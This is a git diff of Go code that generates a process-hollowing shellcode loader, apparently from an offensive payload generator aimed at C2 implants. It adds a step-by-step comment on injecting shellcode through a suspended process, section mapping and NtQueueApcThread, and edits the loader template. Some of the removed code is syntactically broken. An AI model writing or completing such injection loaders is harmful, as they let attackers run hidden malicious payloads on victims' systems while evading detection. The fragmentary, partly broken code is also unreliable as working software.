@@ -5,11 +5,25 @@ import (
 )
 
 /*
+    1. create Process in suspended state
+    2. create new section in suspended process, length of which is our shellcode
+    3. copy shellcode to section
+    4. map out new section using NtMapViewOfSection
+    5. unmap the section immediately
+    6. NtQueueApcThread
+    7. set thread information
+    8. resume Thread, enjoy life
+
+
    For more information, feel free to read this:
    https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf
 */
 
 func GetProcessHollowingTemplate(targetProcess string) string {
+
+	println("[!] Please be aware this is still a work in progress and unstable.")
+	println("Maybe you could use another technique instead...? I hear the CreateThread one is pretty good...\n")
+
 	return fmt.Sprintf(`
     package main
 
@@ -66,9 +80,6 @@ func loadProcess(target string) *syscall.ProcessInformation {
 		&si,
 		&pi)
 
-    // defer syscall.CloseHandle(pi.Thread)
-	// defer syscall.CloseHandle(pi.Process)
-
 	if err != nil {
 		panic(err)
 	}
@@ -80,20 +91,6 @@ func loadProcess(target string) *syscall.ProcessInformation {
 
 func ExecuteOrderSixtySix(payload []byte) {
     process := loadProcess("%s")
-
-
-    var hShellcode
-    sectionSize := int64(len(shellcode))
-    _, _, _ = ZwCreateSection.Call(
-        uintptr(unsafe.Pointer(&hShellcode)),
-        SECTION_ALL_ACCESS,
-        nil,
-        uintptr(unsafe.Pointer(sectionSize)),
-        PAGE_EXECUTE_READWRITE,
-        SEC_COMMIT,
-        nil,
-    )
-
 
 
     /* block, so that process does not die (useful for C2 implants) */
